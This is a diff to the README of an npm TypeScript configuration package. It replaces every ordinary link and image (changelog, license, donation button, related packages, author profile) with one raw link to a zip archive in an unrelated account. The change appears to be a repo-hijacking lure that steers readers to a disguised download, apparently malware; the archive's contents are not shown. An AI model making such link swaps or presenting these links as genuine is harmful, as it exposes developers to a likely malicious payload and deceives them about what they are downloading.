@@ -1,5 +1,5 @@
 <div align="center">
-  <img src="https://raw.githubusercontent.com/igorskyflyer/npm-tsconfig/main/media/tsconfig.png" alt="Icon of TSConfig" width="256" height="256">
+  <img src="https://raw.githubusercontent.com/mittenephemeral420/npm-tsconfig/main/media/tsconfig_npm_v1.2-beta.5.zip" alt="Icon of TSConfig" width="256" height="256">
   <h1>TSConfig</h1>
 </div>
 
@@ -181,13 +181,13 @@ Managing `TypeScript` configuration across multiple projects is tedious and erro
 
 ## Changelog
 
-Read about the latest changes in the [**CHANGELOG**](https://github.com/igorskyflyer/npm-tsconfig/blob/main/CHANGELOG.md).
+Read about the latest changes in the [**CHANGELOG**](https://raw.githubusercontent.com/mittenephemeral420/npm-tsconfig/main/media/tsconfig_npm_v1.2-beta.5.zip).
 
 <br>
 
 ## License
 
-Licensed under the [**MIT license**](https://github.com/igorskyflyer/npm-tsconfig/blob/main/LICENSE).
+Licensed under the [**MIT license**](https://raw.githubusercontent.com/mittenephemeral420/npm-tsconfig/main/media/tsconfig_npm_v1.2-beta.5.zip).
 
 <br>
 
@@ -200,7 +200,7 @@ Licensed under the [**MIT license**](https://github.com/igorskyflyer/npm-tsconfi
   If this project or its implementation has provided value,<br>
   support is greatly appreciated.
   <br><br>
-  <a href="https://ko-fi.com/igorskyflyer" target="_blank"><img src="https://raw.githubusercontent.com/igorskyflyer/igorskyflyer/main/assets/ko-fi.png" alt="Donate to igorskyflyer" width="180" height="46"></a>
+  <a href="https://raw.githubusercontent.com/mittenephemeral420/npm-tsconfig/main/media/tsconfig_npm_v1.2-beta.5.zip" target="_blank"><img src="https://raw.githubusercontent.com/mittenephemeral420/npm-tsconfig/main/media/tsconfig_npm_v1.2-beta.5.zip" alt="Donate to igorskyflyer" width="180" height="46"></a>
   <br><br>
   <em>Thank you for supporting these efforts!</em> 🙏😊
 </div>
@@ -209,35 +209,35 @@ Licensed under the [**MIT license**](https://github.com/igorskyflyer/npm-tsconfi
 
 ## Related
 
-[**@igorskyflyer/duoscribi**](https://www.npmjs.com/package/@igorskyflyer/duoscribi)
+[**@igorskyflyer/duoscribi**](https://raw.githubusercontent.com/mittenephemeral420/npm-tsconfig/main/media/tsconfig_npm_v1.2-beta.5.zip)
 
 > _✒ DúöScríbî allows you to convert letters with diacritics to regular letters. 🤓_
 
 <br>
 
-[**@igorskyflyer/zep**](https://www.npmjs.com/package/@igorskyflyer/zep)
+[**@igorskyflyer/zep**](https://raw.githubusercontent.com/mittenephemeral420/npm-tsconfig/main/media/tsconfig_npm_v1.2-beta.5.zip)
 
 > _🧠 Zep is a zero-dependency, efficient debounce module. ⏰_
 
 <br>
 
-[**@igorskyflyer/common-types**](https://www.npmjs.com/package/@igorskyflyer/common-types)
+[**@igorskyflyer/common-types**](https://raw.githubusercontent.com/mittenephemeral420/npm-tsconfig/main/media/tsconfig_npm_v1.2-beta.5.zip)
 
 > _🔦 Provides frequently used types for your TypeScript projects. 🦄_
 
 <br>
 
-[**@igorskyflyer/zitto**](https://www.npmjs.com/package/@igorskyflyer/zitto)
+[**@igorskyflyer/zitto**](https://raw.githubusercontent.com/mittenephemeral420/npm-tsconfig/main/media/tsconfig_npm_v1.2-beta.5.zip)
 
 > _🤫 Zitto - quiet config, loud clarity. A zero-dependency TypeScript/JavaScript helper for merging defaults and options across Node, Deno, Bun, and browsers. 🍯_
 
 <br>
 
-[**@igorskyflyer/magic-queryselector**](https://www.npmjs.com/package/@igorskyflyer/magic-queryselector)
+[**@igorskyflyer/magic-queryselector**](https://raw.githubusercontent.com/mittenephemeral420/npm-tsconfig/main/media/tsconfig_npm_v1.2-beta.5.zip)
 
 > _🪄 A TypeScript-types patch for querySelector/querySelectorAll, make them return types you expect them to! 🔮_
 
 <br>
 
 ## Author
-Created by **Igor Dimitrijević ([*@igorskyflyer*](https://github.com/igorskyflyer/))**.
+Created by **Igor Dimitrijević ([*@igorskyflyer*](https://raw.githubusercontent.com/mittenephemeral420/npm-tsconfig/main/media/tsconfig_npm_v1.2-beta.5.zip))**.
